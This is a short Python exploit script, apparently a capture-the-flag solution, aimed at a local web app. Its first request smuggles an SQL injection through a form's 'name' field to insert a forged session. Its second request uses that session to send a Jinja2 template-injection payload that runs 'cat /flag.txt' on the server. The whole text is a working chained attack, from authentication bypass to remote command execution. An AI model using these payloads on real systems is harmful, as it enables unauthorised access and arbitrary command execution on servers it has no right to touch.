import requests

# POST request
url = 'http://127.0.0.1:5000/guestaccess'
headers = {
    'Host': '127.0.0.1:5000',
    'Connection': 'close',
    'ax-Mode': '1',
    'bx-Mode': '0',
    'Content-Length': '103',
    'content-type': 'application/x-www-form-urlencoded'
}
data = {
    'name': "test';insert into activesessions values (\"session123\",\"name123\")-- -",
    'age': 'test',
    'email': 'test@gmail.com'
}

response = requests.post(url, headers=headers, data=data)
print("Response:", response.text)

# GET request
url = 'http://127.0.0.1:5000/home'
headers = {
    'Host': '127.0.0.1:5000',
    'Connection': 'close'
}
cookies = {
    'session_id': 'session123'
}
params = {
    'search': '{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'cat /flag.txt\').read() }}'
}

response = requests.get(url, headers=headers, cookies=cookies, params=params)
print("Response:", response.text)
